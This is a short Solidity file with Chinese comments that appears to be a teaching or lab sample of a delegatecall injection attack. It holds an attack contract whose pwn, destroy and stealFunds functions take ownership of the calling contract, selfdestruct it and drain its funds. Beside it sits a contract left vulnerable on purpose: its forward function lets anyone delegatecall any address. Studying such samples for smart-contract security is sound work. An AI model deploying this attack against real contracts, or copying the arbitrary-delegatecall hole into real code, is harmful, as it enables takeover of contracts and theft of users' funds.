// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title DelegateAttack
 * @notice 委托调用注入攻击
 * @dev 利用delegatecall执行恶意代码，篡改存储
 */
contract DelegateAttack {
    address public owner;
    uint256 public value;

    constructor() {
        owner = msg.sender;
    }

    /**
     * @notice 恶意函数：修改调用者的owner
     */
    function pwn() external {
        // 当通过delegatecall执行时，这会修改调用合约的存储slot 0
        // 即调用者的owner变量
        owner = msg.sender;
        value = 999;
    }

    /**
     * @notice 恶意函数：自毁调用者
     */
    function destroy() external {
        selfdestruct(payable(msg.sender));
    }

    /**
     * @notice 恶意函数：提取调用者资金
     */
    function stealFunds(address to) external {
        (bool success, ) = to.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }
}

/**
 * @title VulnerableDelegate
 * @notice 存在delegatecall漏洞的合约
 */
contract VulnerableDelegate {
    address public owner;
    uint256 public value;

    constructor() {
        owner = msg.sender;
    }

    /**
     * @notice 漏洞：任意delegatecall
     */
    function forward(address _target, bytes calldata data) external {
        // VULNERABLE: 任何人都可以delegatecall任意地址
        (bool success, ) = _target.delegatecall(data);
        require(success, "Delegatecall failed");
    }

    receive() external payable {}
}
